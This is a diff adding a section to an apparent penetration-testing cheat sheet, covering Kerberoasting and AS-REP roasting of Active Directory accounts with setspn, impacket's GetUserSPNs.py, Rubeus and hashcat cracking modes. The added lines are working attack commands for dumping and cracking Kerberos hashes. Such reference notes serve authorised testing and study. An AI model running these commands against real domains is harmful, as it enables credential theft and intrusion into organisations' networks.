@@ -296,6 +296,38 @@ The safest to pick is **services.exe**.
 
 ---
 
+### Find AS-Kerbroastable Hash
+
+### With SPN - GetUserSPNs
+
+SPN (Service Principal Name) is the mapping between service and account.
+
+ > 
+ > **<font color=red>setspn -T medin -Q ​ */*</font>**</br>
+ > Enumerate SPN.
+
+ > 
+ > **<font color=red>python3 /opt/impacket/examples/GetUserSPNs.py</font> mydomain.local<font color=red>/</font>myUser<font color=red>:</font>myPassword <font color=red>-dc-ip</font> \[TARGET_DC_IP\] <font color=red>-request</font>**
+ > Dump Kerberos hash of kerberoastable users. (Then hashcat -m 13100).
+
+### With Rubeus
+
+ > 
+ > **<font color=red>Rubeus.exe kerberoast</font>**</br>
+ > Dump Kerberos hashes of kerberoastable users (like GetUserSPNs.py but locally). (Then hashcat -m 13100).
+
+---
+
+### Find AS-REProastable Hash
+
+### With Rubeus
+
+ > 
+ > **<font color=red>Rubeus.exe asreproast</font>**  
+ > Run AS-REP roast command looking for vulnerable users.  (Then Insert `23$` after `$krb5asrep$` and hashcat -m 18200)
+
+---
+
 ### IMPACKET-GETUSERSPNS
 
 ### Principle
